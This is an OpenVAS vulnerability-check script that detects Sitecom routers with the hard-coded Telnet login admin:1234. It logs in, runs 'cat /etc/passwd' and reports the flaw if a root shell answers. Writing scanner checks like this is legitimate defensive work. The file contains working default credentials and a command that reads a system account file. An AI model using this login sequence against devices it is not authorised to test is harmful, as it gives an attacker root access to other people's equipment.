###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sitecom_default_telnet_cred.nasl 6086 2017-05-09 09:03:30Z teissa $
#
# Sitecom Devices Hard-coded credentials
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = " Attackers can exploit these issues to gain unauthorized access to the
affected device and perform certain administrative actions.
Impact Level: System";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103772";

tag_insight = "A user can login to the Telnet service (with root privileges) using the
hard-coded credential admin:1234. This administrative account is hard-coded
and cannot be changed by a normal user.";


tag_summary = "The remote Sitecom Device is prone to a hard-coded credentials bypass
vulnerabillity";

tag_solution = "Updates are available.";
tag_vuldetect = "Start a telnet session with the hard-coded credentials.";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 6086 $");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

 script_name("Sitecom Devices Hard-coded credentials");


 script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/sitecom-n300-n600-access-bypass");
 
 script_tag(name:"last_modification", value:"$Date: 2017-05-09 11:03:30 +0200 (Tue, 09 May 2017) $");
 script_tag(name:"creation_date", value:"2013-08-21 16:02:55 +0200 (Wed, 21 Aug 2013)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Default Accounts");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("telnetserver_detect_type_nd_version.nasl");
 script_require_ports("Services/telnet", 23);

 script_tag(name : "impact" , value : tag_impact);
 script_tag(name : "vuldetect" , value : tag_vuldetect);
 script_tag(name : "insight" , value : tag_insight);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);

 exit(0);
}


include("telnet_func.inc");

port = get_kb_item("Services/telnet");
if(!port)exit(0);

if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);
if(!soc)exit(0);

buf = telnet_negotiate(socket:soc);
if("login:" >!< buf) {
  close(soc); 
  exit(0);
}  

send(socket:soc, data:'admin\r\n');
buf = recv(socket:soc, length:1024);

if("Password:" >!< buf) {
  close(soc);
  exit(0);
}  

send(socket:soc, data:'1234\r\n');
buf = recv(socket:soc, length:1024);

if("#" >!< buf) {
  close(soc);
  exit(0);
} 

send(socket:soc, data:'cat /etc/passwd\r\n');
buf = recv(socket:soc, length:1024);

close(soc);

if("admin:" >< buf && "/bin/sh" >< buf) {
  security_message(port:port);
  exit(0);
}  
